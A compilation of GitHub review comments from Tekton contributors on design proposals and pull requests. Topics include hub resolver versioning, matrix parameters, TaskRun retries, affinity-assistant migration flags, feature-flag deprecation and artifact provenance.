comments.author: wlynch
comments.body:
I'd lean towards dropping this for the new artifacthub impl:

1. semver with a missing minor/patch version generally uses the latest version matching the prefix (i.e. the golang 1.19 docker image refers to the latest patch version 1.19.2) - I'm not sure we want to have the resolver implement this kind of lookup behavior.
2. I'm worried about version skew for ArtifactHub URLs - e.g. https://artifacthub.io/packages/tekton-task/tekton-catalog-tasks/git-clone/0.8.0 (even though this points to the 0.8 git tag), but https://artifacthub.io/packages/tekton-task/tekton-catalog-tasks/git-clone/0.8 404s.

It'll probably be simpler long term for the resolver to interpret the user provided version tag as-is, so it always matches the upstream state (up to you if you want to preserve the old behavior for compatibility).

comments.author: QuanZhang-William
comments.body:
The Artifact Hub always converts the [resource yaml version](https://github.com/tektoncd/catalog/blob/962f9005350b1acb359558b6c5aafc420e0beb46/task/git-clone/0.8/git-clone.yaml#L6) and git tag to semVer [here](https://github.com/Masterminds/semver/blob/b8121eb457fd2944a4bf285e3197f729f5595b95/version.go#L156) (by appending 0 as minor and patch version if missing) and requires the exact match between the 2 after conversion. 

For 2, I don't think there is version skew for the Artifact Hub URL since all the valid URLs will use semVer no matter how do you tag the repo, and URLs with simple semver will always return 404s.

Because the resource is indexed by the [resource yaml version](https://github.com/tektoncd/catalog/blob/962f9005350b1acb359558b6c5aafc420e0beb46/task/git-clone/0.8/git-clone.yaml#L6), we cannot use the latest version matching the prefix logic here (so we can only append 0s).

So it seems to me that the lookup here brings the extra backward compatibility benefit and does not cause any problems (i.e. version `0.6` and version `0.6.0` in the hub resolver always points to the same resource)?

comments.author: pritidesai
comments.body:
Hey @lbernick to get the following combos (copied from your initial comment for readability):

- {"linux/amd64", "-race -cover -v", "chrome"}
- {"linux/ppc64le", "-race -cover -v", "chrome"}
- {"linux/s390x", "-cover -v", "chrome }
- {"linux/amd64", "-race -cover -v", "safari"}
- {"linux/ppc64le", "-race -cover -v", "safari"}
- {"linux/s390x", "-cover -v", "safari"}


This combo includes three params `GOARCH`, `flags`, `browser` (which is a little weird example while talking about golang test but its fine to include from the understanding perspective).

The matrix `params` section will include `GOARCH` and `browser` which will result in six combinations. The `include` section will expand on the each combination based on the `flags`.

You will write your pipeline like this:

```
      matrix:
        params:
          - name: GOARCH
            value:
              - "linux/amd64"
              - "linux/ppc64le"
              - "linux/s390x"
          - name: browser
            value:
            - "chrome"
            - "safari"
        include:
          - name: s390x-no-race
            params:
              - name: GOARCH
                value: "linux/s390x"
              - name: flags
                value: "-cover -v" 
```

Here we are leveraging default value of `flags` which is `"-race -cover -v"`. Let's say there was no default value for flags available, we will define the pipeline like this:

```
      matrix:
        params:
          - name: GOARCH
            value:
              - "linux/amd64"
              - "linux/ppc64le"
              - "linux/s390x"
          - name: browser
             value:
               - "chrome"
               - "safari"
          - name: flags
             value: "-race -cover -v" 
        include:
          - name: s390x-no-race
            params:
              - name: GOARCH
                value: "linux/s390x"
              - name: flags
                value: "-cover -v"
```

comments.author: XinruZhang
comments.body:
Thanks Andrea @afrittoli !

Great point for the `CompletionTime`, agreed!

As for the `Reason`, then I guess we can do the following transition: 
 
| `Status` | `Reason` | `Description`| 
|:----|:----|:----|
| `Unknown` | `Running` | The first attempt|
| `Unknown`| `ToBeRetried`| The intermidiate status that reflects that the TaskRun failed/timedout and will be retried| 
| `Unknown` | `Running (2nd attempt)`| The second attempt| 

`ToBeRetried` and `Running (2nd attempt)` are the two noticable changes, I prefer this change because:
- The `TaskRun.Status` describes what's the current state of the scheduled `TaskRun`
- There are two different kind of `Status` for a TaskRun: 
  1. The first kind (`Running`, `Pending` ) can **lasts a period of time**, in practice, it means this state can accorss **MULTIPLE** reconcile loops. 
  2. The second kind (`Started`) reflects a state of a TaskRun **at one point in time**, in practice, it means this state only exists in **ONE** reconcile loop.
  
 Therefore, to describe the intermediate status --_the first attempt of that TaskRun has failed, and will be retried_,  `ToBeRetried` sounds more appropriate than `Retrying`. In the meantime, it doesn't imply the `TaskRun` has completed comparing to `CompletedWithRetries`.
 
For `Running (2nd attempt)`, it is more descriptive than `Running`, thanks for the naming advice!

comments.author: XinruZhang
comments.body: Oh, another thought: does changing `Running` to `Running (2nd attempt)` breaks anything? Do downstream CI tools rely on the `Running` reason? If so, we'd better to keep `Running`

comments.author: pritidesai
comments.body:
> The completionTime should only ever be set then the execution of the TaskRun is complete. CompletionTime is set along with status to True or False.

Without setting the completion time here, how do we discover the completion time of each retry attempt?

A sample `status` of a pipelineTask which was retried three times:

```
taskRuns:
    pr-l5lwg-simple-task:
      pipelineTaskName: simple-task
      status:
        completionTime: "2022-10-13T19:08:57Z"
        conditions:
        - lastTransitionTime: "2022-10-13T19:08:57Z"
          message: Pod was active on the node longer than the specified deadline
          reason: Failed
          status: "False"
          type: Succeeded
        podName: pr-l5lwg-simple-task-pod
        retriesStatus:
        - completionTime: "2022-10-13T19:08:53Z"
          conditions:
          - lastTransitionTime: "2022-10-13T19:08:53Z"
            message: TaskRun "pr-l5lwg-simple-task" failed to finish within "2s"
            reason: TaskRunTimeout
            status: "False"
            type: Succeeded
          podName: pr-l5lwg-simple-task-pod
          startTime: "2022-10-13T19:08:50Z"
        - completionTime: "2022-10-13T19:08:55Z"
          conditions:
          - lastTransitionTime: "2022-10-13T19:08:55Z"
            message: TaskRun "pr-l5lwg-simple-task" failed to finish within "2s"
            reason: TaskRunTimeout
            status: "False"
            type: Succeeded
          podName: pr-l5lwg-simple-task-pod
          startTime: "2022-10-13T19:08:53Z"
        - completionTime: "2022-10-13T19:08:57Z"
          conditions:
          - lastTransitionTime: "2022-10-13T19:08:57Z"
            message: TaskRun "pr-l5lwg-simple-task" failed to finish within "2s"
            reason: TaskRunTimeout
            status: "False"
            type: Succeeded
          podName: pr-l5lwg-simple-task-pod
          startTime: "2022-10-13T19:08:55Z"
```

`retriesStatus` holds `startTime` and `completionTime` of each attempt. The `completed` in status also meant to distinguish that the existing attempt is done and completed at this time, now the next attempt is running.

comments.author: XinruZhang
comments.body:
The reason that I'm comparing strings instead of using `errors.Is()` in this PR:

I tried to define var expectedError := errors.New("xx") so that I can use Error.Is() to compare the errors, then I figured out that `Reconcile()` can return different error types (`controller.PermanentError`, `multierror.Error`):
https://github.com/tektoncd/pipeline/blob/f732985ec30817703e6eeaa6914cc77a2b8adf3c/pkg/reconciler/taskrun/taskrun.go#L314-L318

I defined the two types of errors in this test case, one works fine (controller.PermanentError).

However, the "errors.Is()" does not work for `multiperror.Error`", then I used `cmp.Diff()` to see what's the difference, The result indicates that it compares the pointer values:

**The code**

```
wantEr := (&multierror.Error{Errors: []error{errors.New("missmatched Types for these results, map[aResult:[array]]")}}).ErrorOrNil()
err := c.Reconciler.Reconcile(testAssets.Ctx, getRunName(tc.tr))

if d := cmp.Diff(err, wantEr, cmpopts.EquateErrors()); d != "" {
  t.Errorf("got: %v, want: %v, diff: %v", err, tc.wantReconcileError, d)
}
```

**The comparison result**
```
, diff   (*multierror.Error)(
- 	&⟪0xc000525420⟫{
- 		Errors: []error(⟪ptr:0xc000875d10, len:1, cap:1⟫{
- 			&⟪0xc000875bf0⟫"errors".errorString{s: "missmatched Types for these results, map[aResult:[array]]"},
- 		}),
- 	},
+ 	&⟪0xc00088d200⟫{
+ 		Errors: []error(⟪ptr:0xc0003d6480, len:1, cap:1⟫{
+ 			&⟪0xc0003d6440⟫"errors".errorString{s: "missmatched Types for these results, map[aResult:[array]]"},
+ 		}),
+ 	},
  )
```

Okay okay, then, maybe I should retrieve the Error embedded in multierror.Error() out and the use errors.Is(), but to do that, I have to do `type assertion` on that error so that I can use `(*multierror.Error).Unwrap()`. But wait, this is against `DAMP` instead of `DRY` in unit tests: https://testing.googleblog.com/2019/12/testing-on-toilet-tests-too-dry-make.html

For the reasons above, I would suggest going to the route sticking to the string comparison (which is not ideal!) here. I would love to hear from any advice if that could be cleaner here.

comments.author: afrittoli
comments.body:
Thanks for the good discussion on this topic. 

I definitely agree that we need to have a clear separation between the `PipelineRun` controller and the `TaskRun` / `CustomRun` controller, and what @lbernick highlighted in https://github.com/tektoncd/pipeline/issues/5248 - i.e. that the `TaskRun` reconciler will use the length of its `RetriesStatus` to determine what to name the pod, is not great. 

About `RetriesStatus` specifically, the fact that `RetriesStatus` exists in a `TaskRun` is not ideal, because that's not something that the `TaskRun` controller should be concerned with, in the current implementation. 
Similarly, we should not need `RetriesStatus` in `CustomRuns`:
- if retries are implemented by the `PipelineRun` controller, it should keep in the `PipelineRun` this status info
- if retries are implemented by the `CustomRun` controller, it's not something that the `PipelineRun` controller needs to know about. If the `CustomRun` controller needs to store data in the status, it can do so, but it doesn't have to be a standard location as the `PipelineRun` controller will not use it.

My preferred overall setup would be:
- Focus on `PipelineRun` driven retries. Advantages:
  - Users have a consistent interface for retries
  - Custom task controller developers get a default implementation of retries for free (by embedding in a pipeline)
  - "Pipelines in pipeline" can be retried the same as the other resources
  - No changes to the `PipelineRun` API (not in the `spec` at least)
  - No changes to the `TaskRun` API (not in the `spec` at least)
- Remove `RetriesStatus` from `TaskRuns` and `CustomRuns`
- Improve the retries of `TaskRuns` by using separate `TaskRuns` for each retry 
  - This means we can see the logs of failed retries too
  - Dashboard and CLI may need extra work for this
- Deprecate `spec.retries` in `Run`

Most CI/CD systems have the configurable retry stragety. See the [related work](https://github.com/tektoncd/community/blob/6d02bac0ede7758519d4f36e82d835b7252e63fe/teps/0121-unified-retries-for-taskruns-and-customruns.md#related-work).

- For RuntimeObject driven retries, no changes to the PipelineRun API neither.

> No changes to the TaskRun API (not in the spec at least)

- For RuntimeObject driven retries, indeed, it adds an extra API field `retries`, but this would be an addictive change rather than backward-incompatible change, wdyt?

- taskrun retry on its own

comments.author: afrittoli
comments.body:
I understand the purpose of this intermediate `reason` but I'm not sure how it will be implemented.
When the `TaskRun` reconciler detects a failure in the underlying `Pod`, it will:

- store the data of the current run in `retriesStatus`
- if there are no retries left, mark the `TaskRun` as failed
- else, clean up the current `TaskRun` status
- set the `reason` to `ToBeRetried`

At this point, the controller could start the next `TaskRun`, but if it does so, the `ToBeRetried` value will never make it into `etcd`. To make the `ToBeRetried` reason visible to watchers we will have to finish the reconcile cycle and start the retry in the next reconcile cycle.

Is this the planned implementation? It seems to me that the reconcile cycle should do ask much as possible to reconcile the resource, rather than stop and wait for the next reconcile. 
I'm guessing that the changes to the `TaskRun` done by the reconcile will trigger another reconcile cycle, but I'm not 100% sure.

> Is this the planned implementation? 

Yes, that is the current implementation.
 
> The reconciliation cycle should do as much as possible to reconcile the resource, rather than stop and wait for the next reconciliation.

I see, but as you said, the ToBeRetried value will never make it into etcd, then it would be impossible for end users to listen to the retry event; 

And we mark TaskRun as failure for a range of reasons, not only just for pod failure – for example "timeout",  there are other types of failures (search for "MarkResourceFailed" in https://github.com/tektoncd/pipeline/blob/main/pkg/reconciler/taskrun/taskrun.go). 

From the implementation point of view, it is neater for us to mark it as "ToBeRetried" before sending it out for another round of reconciliation. (in [finishReconcileUpdateEmitEvents()](https://github.com/tektoncd/pipeline/blob/963aa40829045a349c8f78d4fa3dd10ffca46282/pkg/reconciler/taskrun/taskrun.go#L292) is a great place to do that because it will be called every time we exit the reconciliation)

> I'm guessing that the changes to the TaskRun done by the reconcile will trigger another reconcile cycle, but I'm not 100% sure.

I need to verify if every change to the TaskRun will trigger another reconcile cycle. One thing I'm sure of is we send k8s events and cloud events every time there's a condition change on TaskRun.

comments.author: afrittoli
comments.body:
This TEP **does not** consider the partial execution of a pipeline that reached completion, whether successful or not. The key assumption for the retries in this TEP is that the pipeline is **still running**. 

If a `PipelineTask` marked for "on-demand-retry" fails, the execution of the `Pipeline` continues until either of the following happens:

- the `PipelineTask` is successful, and the associated branch of execution is resumed. This may happen if a retry is requested and is successful. 
- timeout is reached
- the `PipelineRun` is cancelled

comments.author: afrittoli
comments.body:
It seems to me that this belongs more to the design details than to the goals.
The goal is to allow for on-demand retries of a `PipelineTask`:

- if a task fails the `PipelineRun` execution does not end
- execution of `PipelineTasks` that do not depend on the failed one continues normally
- one or more retries of the failed `PipelineTask` may be requested, until either
  - the `PipelineTask` is successful
  - the `PipelineRun` times out
  - the `PipelineRun` is cancelled

comments.author: pritidesai
comments.body:
Right, retry logic is not on demand. Jenkins is responsible for retrying in case of a connection issue.

But, Jenkins does support catching failures and further processing somehow:

```
Retry the block (up to N times) if any exception happens during its body execution. If an exception happens on the final attempt then it will lead to aborting the build (unless it is caught and processed somehow). User aborts of the build are not caught.
```

I have not looked into it further though.

Also, Jenkins support `conditions` which is very advanced in terms of specifying what condition triggers the retry. Also, Jenkins retry logic understands the difference between infrastructure failure (connection to agent itself is broken) v/s build failure and allows pipeline author to choose to retry in case of an infrastructure failure. Jenkins retry logic can also distinguishes between pod termination v/s pod deletion.


```
conditions (optional)
Conditions under which the block should be retried. If none match, the block will fail. If there are no specified conditions, the block will always be retried except in case of user aborts.
Array / List of Nested Choice of Objects
agent
Detects that a node block, or certain steps inside it such as sh, failed for reasons which are likely due to infrastructure rather than the behavior of the build. If the connection to an agent is broken or the agent is removed from the list of executors while in use (typically in response to the disappearance of underlying cloud resources), this condition will allow retry to allocate a fresh agent and try the whole block again.
kubernetesAgent
Similar to agent() (Agent errors) but tailored to agents provisioned from a Kubernetes cloud. Unlike the generic agent error condition, this will ignore certain pod termination reasons which are likely to be under the control of the Pipeline author (e.g., OOMKilled) while still allowing retry to recover after common cases of pod deletion.
handleNonKubernetes : boolean (optional)
Behave like the generic agent() (Agent errors) when applied to a non-Kubernetes agent. Useful in cases where it is hard to predict in a job definition whether a Kubernetes or other sort of agent will be used.
nonresumable
The Jenkins controller was restarted while the build was running a step which cannot be resumed. Some steps like sh or input are written to survive a Jenkins restart and simply pick up where they left off when the build resumes. Others like checkout or junit normally complete promptly but cannot tolerate a restart. In case one of these steps happened to be in progress when Jenkins shut down, the resumed build will throw an error; using this condition with retry allows the step (or the whole enclosing node block) to be rerun.
```

What we are trying build in this PR is the limitation in Jenkins that the users are experiencing: https://issues.jenkins.io/browse/JENKINS-54735 And something on their roadmap.

comments.author: afrittoli
comments.body:
The `Task` in question is expanding params directly in a script, which is a bad practice because it exposes scripts to malicious injections.

A better implementation would be:

```yaml
        steps:
        - name: build-and-push
          image: $(params.MAVEN_IMAGE)
          env:
          - name: CACERTFILE
            value: $(params.CACERTFILE)
          - name: INSECUREREGISTRY
            value: $(params.INSECUREREGISTRY)
          - name: IMAGE
            value: $(params.IMAGE)
          # Make sh evaluate $HOME.
          script: |
                #!/bin/bash
                [[ -f "/tekton-custom-certs/${CACERTFILE}" ]] && \
                keytool -import -keystore $JAVA_HOME/lib/security/cacerts -storepass "changeit" -file "/tekton-custom-certs/${CACERTFILE}" -noprompt
                mvn -B \
                -Duser.home=$HOME \
                -Djib.allowInsecureRegistries=${INSECUREREGISTRY} \
                -Djib.to.image=${IMAGE} \
                compile \
                com.google.cloud.tools:jib-maven-plugin:build
```

The `env` in the example above could actually load values from a config map or secret, but that ability would have to be implemented in the `Task` and it would replace the ability to pass value directly via parameters, which is not very portable and user friendly.

The tool you linked is meant to detect more like accidentially added secrets in git repositories. That can happen quite easily when you worked with something that puts secrets in the working directory and commit everything to git. You can detect those with pattern matching.

comments.author: chitrangpatel
comments.body:
After running the e2e tests, this approach was a little brittle so upon Billy's suggestion, we updated it slightly. The outcome is still the same. Just the details of how the sidecar binary knows that the result is "fully" written (so that it does not read a result that is still being written to) are different. I am happy to meet and discuss in detail but here is the upshot:

The `Sidecar` will run a binary that:
- receives argument for `result directory` and `result names` identified from `taskSpec.results` field. This allows the Sidecar to know the results it needs to read.
- has `/tekton/run` volume mounted where status of each step is written.
- periodically checks for step status in the directory `/tekton/run`.
- when all steps have completed (or when a step has failed), it immediately parses all the result in results directory and prints it to stdout in a parsable pattern.

comments.author: l-qing
comments.body:
Question about `ScheduledTemplateSpec` design:

I noticed that `ScheduledTemplateSpec` duplicates the `Params` and `ResourceTemplates` fields from `TriggerTemplateSpec`:

- `TriggerTemplateSpec`:
  - https://github.com/tektoncd/triggers/blob/d7ac246c4a7b93acf6a3eafbf8b7a7a371acaa19/pkg/apis/triggers/v1alpha1/trigger_template_types.go#L30-L35
- `ScheduledTemplateSpec`:
  - https://github.com/sudhishmk/triggers/blob/46a6a37c0b06ad2ec87aec98fe2c3f5267f85d3c/pkg/apis/triggers/v1alpha1/scheduled_template_types.go#L29-L39

Both structs have identical field definitions for these two fields. This also leads to duplicated validation code in scheduled_template_validation.go - the functions `validateTriggerResourceTemplate` and `verifyScheduledResourceParamDeclarations` are essentially copies of the validation logic in trigger_template_validation.go.

Have you considered embedding `TriggerTemplateSpec` directly? Something like:

```
type ScheduledTemplateSpec struct {
    TriggerTemplateSpec `json:",inline"`
    CloudEventSink *apis.URL `json:"cloudEventSink,omitempty"`
    Schedule string `json:"schedule,omitempty"`
}
```

This would:
- Eliminate code duplication
- Allow reusing TriggerTemplateSpec's validation methods directly
- Make future maintenance easier

Is there a specific reason for keeping them separate that I might have missed?

comments.body: @l-qing Thanks for the detailed review! Apologies for so late reply, I somehow missed this comment.  I've refactored ScheduledTemplateSpec to embed TriggerTemplateSpec directly as suggested

comments.author: afrittoli
comments.body:
This proposal breaks the fundamental assumption that one `xRun` object is associated with one execution of that resource. The only slight exception that we have to that model today is "retries" - which in any case are still part of the same single execution.

If we had a long-running `PipelineRun` associated with multiple executions, we would have to significantly change the affinity assistant, the way we manage PVC, and for `TaskRuns` the way we manage pods, logs etc. 
It would be a breaking change for all tools like CLI and dashboard too.

I think a better approach is a dedicated CRD for that. Whether that is should be managed by the triggers controller, the pipeline controller or a brand-new controller I'm not sure thought :D

comments.author: XinruZhang
comments.body:
Hi @afrittoli, thank you for the comment, IIUC (please correct me If I'm wrong!), **Pipelines** and **Tasks** are originally designed as **static reusable components** in the Tekton ecosystem. I would imagine that storing them in the local cluster is the easiest and most intuitive approach at that time. While we use **Runtime Resources** (within where static reusable components can be incorporated by reference) to define the CI/CD. 

Requiring vendors who provide CI/CD solutions to host static reusable components does not sound very intuitive -- especially given that we have remote resolution today.

A similar case is **Docker Daemon** and **Docker Registry**: **DockerDaemon** listens for **Docker API** requests and manages Docker objects such as images, containers, networks, and volumes, while **_Docker Registry_** is the place to store reusable images.

Conformant **Tekton Pipeline Service** listens for Pipeline API request and manages **Pipelines Runtime Objects** such as `PipelineRun`s and `TaskRun`s, while **_Tekton Hub / Catalog_** is the place to store reusable pipelines/tasks.

Let me know your thoughts!

comments.author: QuanZhang-William
comments.body:
Sorry, I didn't get the point about introducing  `coschedule-workspaces` until we remove `disable-affinity-assistant` when reading the TEP. I missed earlier discussion around the topic so my understanding could be off.

This is my understanding about the migration strategy for backward compatability:

- by setting `disable-affinity-assistant` to false, we enforce the 'coscheduling' must be set to "disabled" => current behavior of AA (enabled)
- by setting `disable-affinity-assistant` to true, the default 'coscheduling' is "disabled" => current behavior of AA (disabled)

During the migration 9-month, users can use the new feature by setting `disable-affinity-assistant` to true and
set `coscheduling` to any value to get corresponding behavior.

After 9 month, we just remove `disable-affinity-assistant` and we don't need to change 'coscheduling'.

--- 
so I'm not following the part about why we need to *disallow coscheduling" is set to "coschedule-workspaces" but "disable-affinity-assistant is set to "true* (I think the user just want to use this behavior with new setting, though the same behavior can be achieved by setting `disable-affinity-assistant` is set to "false")

And in the [Configuration](https://github.com/tektoncd/community/blob/main/teps/0135-coscheduling-pipelinerun-pods.md#configuration), we mentioned that `If "disable-affinity-assistant" is set to "false", "coscheduling" must be set to "disabled"`. (that basically means, during the migration period, the AA behavior is ONLY determined by  if `disable-affinity-assistant` if is set to false; if `disable-affinity-assistant` if is set to true, we will further check `coscheduling`)

comments.author: lbernick
comments.body: I think what's confusing about "coschedule-workspaces" + "disable-affinity-assistant"=true is that the user has gone out of their way to change both default values, but one flag indicates we should have the affinity assistant turned on and one flag has it turned off. it's not clear which flag's behavior we should use there. With coscheduling disabled and "disable-affinity-assistant"=false, it's also true that the flags signal opposite behavior, but in this case the user has accepted the default values, in which case we should preserve backwards compatibility with existing default behavior.

comments.author: QuanZhang-William
comments.body:
I think we still need to call APIs to delete `pvcs` at `pr` completion/deletion time anyways. 

The advantage of this approach is that there is no extra work to delete the `pvcs` at `pr` deletion time, as the owner of the `pvcs` are the `prs` not the `aa statefulset` (i.e. k8s automatically deletes the pvcs when the owning prs are deleted). 

In addition, this patch fully reverts the pvcs behaviours in 1 pull request. If we just revert the highlighted part but not merge the followup prs in one release, users will still see the different behavior (i.e. `pvcs` are not deleted when `pr` is deleted). 

I personally feel this full revert could be a better solution. I'm open to the partial solution if we can make sure to merge all the followup prs in one pr, but I don't see much advantage.

WDYT @lbernick @pritidesai @afrittoli

comments.author: lbernick
comments.body:
my thought process was that we can introduce backwards incompatible changes in a v1.0.0 release, so it's sort of our "chance" to make any small backwards incompatible changes we want to make. The v1 TEP actually proposes swapping the default value of "disable-affinity-assistant" in v1. However, looking at semver.org more closely, this is not really what it says-- it says that before you release v1.0, "Anything MAY change at any time. The public API SHOULD NOT be considered stable" and afterwards, "Major version X (X.y.z | X > 0) MUST be incremented if any backward incompatible changes are introduced to the public API." (We aren't really following semver since we are trying to maintain backwards compatibility w/ version < 1.0.)

Anyway, I don't think this TEP is the right place to discuss semver and when it's appropriate to make backwards incompatible changes, so I think it would be fine to just say we'll remove the flag after an appropriate deprecation period, and have a separate discussion about what changes we want to make before releasing a v1.0.

comments.author: lbernick
comments.body:
It may be helpful to rephrase the chart in terms of actions a user needs to take:
- If you want default behavior of coschedule-workspaces, no action needed
- If you were already disabling the affinity assistant, no action needed now, but at some point you'll need to set `coscheduling` to `disabled`.

For Andrea's proposal:
- If you were previously accepting default behavior but now want one of the new features, just set `coscheduling` to the value you want
- If you were previously disabling the affinity assistant but want one of the new features, you need to set `disable-affinity-assistant` back to "false" and then turn on the new behavior.

For Quan's original proposal:
- If you were previously accepting default behavior but now want one of the new features, you need to  set `disable-affinity-assistant` to "true" and then turn on the new behavior.
- If you were previously disabling the affinity assistant but want one of the new features,  just set `coscheduling` to the value you want.


I personally find Quan's original proposal less confusing, but I am open to either. The two most important things IMO are:
1. Preserving existing behavior for users setting "disable-affinity-assistant" to "true" (which both of these proposals do)
2. Including the chart in our docs

comments.author: afrittoli
comments.body:
The HA relies on the shading of resources, which is based on the resource key `namespace/name`, which means that all reconciles for a certain resource are going to be served by the same controller, and thus find relevant data in the cache. 

A controller restart drops the cache, which means that some events may be sent twice (those for running resources).

So this file was renamed in the previous PR but the signature remained the same.

Now the signature changes and `NewReconciler` is a public API.

What would be a good way going about it?

If you change downstream consumers will break and have to fix their code.

If you deprecate and introduce a new function, downstream consumers will have more time to migrate but it will be more effort now.

The procedure could be:
- Add a Godoc Deprecated: comment pointing to the replacement
```go
// NewReconciler creates a new Reconciler with the given clients.
//
// Deprecated: use NewReconcilerBigCache instead.
func NewReconciler(...) *Reconciler { ... }
```
- Introduce the new function alongside the old one for at least one release so downstream consumers have time to migrate.
- Remove the old function in a subsequent release. And for that you'd probably need a reminder or an issue.

Wdys? Maybe it's not worth the effort, because the change is in little used area. You know better here  😺 

Same applies to all other public API changes in this PR.

No, events are only sent if a sink is configured, exactly like today.
Today every reconcile cycle checks the configuration to see if events need to be sent. 
That logic will be moved to a dedicated controller and will grow feature-wise over time. Operators may decide to not install the event controller at all if they do not plan to use events.

comments.author: afrittoli
comments.body:
Some more info about CDEvents.

A list of implementations:
- Jenkins can produce CDEvents
- ArgoCD has an [RFC](https://github.com/argoproj/argo-cd/pull/13723), I plan on collaborating on one for Argo workflows too
- Spinnaker proposal has been accepted, and the implementation is under review
- Testkube has been implemented
- Tekton has CDEvents events in the events controller in the experimental repo, this TEP proposes moving that to official support

The CDEvents project is also working with other communities, like Harbor (CNCF container registry), the proposal is close to being merged and I demoed the implementation already. We are also collaborating with CNCF, OpenSSF and VSMI.

CDEvents benefits from contribution from 20 different companies, including IBM, Ericsson, Apple, Fidelity, SAS and many more.

comments.author: afrittoli
comments.body:
The HA relies on the shading of resources, which is based on the resource key `namespace/name`, which means that all reconciles for a certain resource are going to be served by the same controller, and thus find relevant data in the cache. 

A controller restart drops the cache, which means that some events may be sent twice (those for running resources).

Enabling all alpha features does not mean that all those features are used as well, and vendors could still document that only certain features are enabled, but I understand that that is not the same as preventing a feature from being used.

One note is that the controller code usually is not feature flag gated either, but certain code paths should only be enabled if the corresponding API fields are used, and we control that via validation.

comments.author: afrittoli
comments.body:
If an operator enables a feature `foobar` before it's stable, they will have the `enable-foobar` flag set to true. Once the feature is promoted to stable, they should be able to continue using the feature seamlessly, i.e. we should ignore `enable-foobar=true`.
 
If an operator disables a feature `foobar` before it's stable, once the feature becomes stable they will have to decide what to do. If they still don't want users to use that feature they may employ a custom admission controller to do so. I believe the best user experience would be to be notified that the flag is deprecated and will be removed in X releases so that they have time to develop an alternate solution - that requires the flag to continue work for some time after the flag reaches `stable`. 

If an operator does not set the `enable-foobar` flag (they use the default value), the switch to `stable` will be transparent to them. They will be aware through release notes that a new API feature is available.

I don't think we should keep the flag around if it cannot be used. I would recommend deprecating it instead and then removing it after the deprecation period.

> do we expect the cluster operator to delete that feature flag from their deployment script

@pritidesai I think we should issue a warning if the flag is set to `false` (i.e. feature disabled) starting with `0.53`. From `0.58` we can apply the behaviour we apply for unknown flags (I'm not sure if we fail or ignore?)

- Previously we haven't had any real "source of truth" to tell what stability of a feature is apart from [additional-configs.md](https://github.com/tektoncd/pipeline/blob/release-v0.51.x/docs/additional-configs.md#alpha-features) which relies on manual edition and they can be moved to elsewhere sometimes (i recall once we had beta feature list in `install.md` , take [v0.41.x](https://github.com/tektoncd/pipeline/blob/release-v0.41.x/docs/install.md) for example). So with this field added, this should be regarded as the only source of truth for telling which stability level a feature is at currently.
- As pointed here, for easier documentation purposes. Moreover, Maintainers/ Cluster operators would have a better sense of which stability level the specific feature is at.

With `reusable steps`, users will have the ability to back `artifacts` to other locations as well.
The "trusted" nature of `artifacts` is related mainly with the ability to compute and verify the hash. I wonder if we should split it up into two steps:

comments.author: chitrangpatel
comments.body:
I think we would run into the following issue here:

If users simply make the data available at  `$ARTIFACT_OUTPUTS` then how do they inform the Tekton Controller about their desired storage location? What if they are not ok with the PVC based storage and instead want to upload to GCS? How do they inform their need to the Tekton controller without the Artifact API in the first place?

Instead, if we have it such that without the Artifact API, they have to write their steps to do all the work (i.e. archiving, uploading of Artifacts and making the metadata available at `/tekton/artifacts/uploads/<digest>.json`). The expectation from the users is to populate `/tekton/artifacts/uploads/<digest>.json` instead of making the artifacts available at `$ARTIFACT_OUTPUTS`. The digest binary would then just look for the metadata of the artifact and skip the archiving and upload part. **(Here, I'm assuming that the `digest step` also uploads the artifact metadata via `Termination Message/Sidecar Logs based` solution.)**

This way, the users can upload their artifacts wherever they want and still get them in the Provenance because they are providing the metadata file. 

With the Artifact API, users would be able to (probably in the future) say which reusable Step they want to back the artifact with. For example (expanding the Artifacts API):
```yaml
spec:
  pipelineSpec:
    tasks:
      - name: producer
        taskSpec:
          outputs:
            artifacts:
              - name: aFileArtifact
                using: # This is the step that backs the upload of the artifact
                  resolver: git
                  params:
                    url: ...
```


Without the Artifact API, they should to do all the work themselves because the Controller cannot get any input about the user's desire.

comments.author: chitrangpatel
comments.body:
I think we should allow multiple digest values. Here is why (mostly future thinking). 

If the user wants to upload the artifact to git or OCI (e.g. using `StepActions` or without the use of `Artifact API`) then they will likely have something like `sha1` or `sha256`. That value is also important when downloading the artifact (not just for verification) since it acts like the `commit sha`.
In addition, we might want the hash (e.g. `md5sum` like you showed in your POC) computed by Tekton when the artifact was produced so that we can validate that specific hash when consuming the artifact in a later Task. This way, Tekton can always validate against its own hash for verification.

comments.author: afrittoli

@dibyom steps within a task are executed sequentially. 

Another step could alter executed after the first could alter what the first step produced, but this proposal only ensures that a consuming `Task2` can verify that what it receives as the output of `Task1` is what `Task1` actually produced. It doesn't really tell `Task2` anything about the status in between steps.

A workload that belongs or does not belong to the `PipelineRun` could alter the content of the workspace in between tasks, but after this TEP such change would invalidate the provenance data, which is written in the `TaskRun` status and signed (once we have Spire integration). If a malicious third-party workload tried to update the provenance in the status, the status signature would be invalidated.

About the "read write many", the "many" refers to (thanks @pritidesai for pointing that out) "many nodes" i.e. all `Pods` on the same nodes will have access to the PVC.

comments.author: lbernick
comments.body:
I'm concerned about array indexing into matrixed results for a few reasons:
- UX issues: the user needs to run the pipeline to determine the correct indices to use. If they rename or change params, they will need to rewrite their pipeline.
- Pipelines will not work for different input parameters. This conflicts with our reusability design principle (https://github.com/tektoncd/community/blob/main/design-principles.md#reusability) which states that "At run time (i.e. when invoking a Pipeline or Task via PipelineRun or TaskRun), users should be able to control execution as needed by their context without having to modify Tasks and Pipelines".
- We cannot evolve the implementation of matrix. Deterministic ordering of taskruns was not intended to be a behavior users should rely on (see discussion [here](https://github.com/tektoncd/pipeline/pull/6312#discussion_r1131175378)) and in fact, I think we should allow ordering to be randomized so that users don't come to depend on it. (This is what Go chose to do for the order of iteration over map keys, for a very similar reason: https://go.dev/doc/go1#iteration)

comments.author: pritidesai
comments.body:
> What is the use case for dynamically fanning out combinations based on params, but then only using some of those combinations in later tasks? 

One of them is documented under [Platforms and Browsers](https://github.com/tektoncd/community/blob/4d3cb3b82a9fdb602d91170c752a030faeded9ea/teps/0140-producing-results-in-matrix.md#2-platforms-and-browsers-1) section.

In addition to this, there are many common CI/CD use cases with this kind of requirement in the industry. In microservices world that we are in today, most of the applications comprised of multiple repos, e.g. (1) Source Code (2) Configurations. To bless an application deployment in production, all the repos has to be built using the same `build task` which might be producing a `digest` as a task result. When it comes to deployment task, a digest from building a source repo is needed but not the configuration repo.

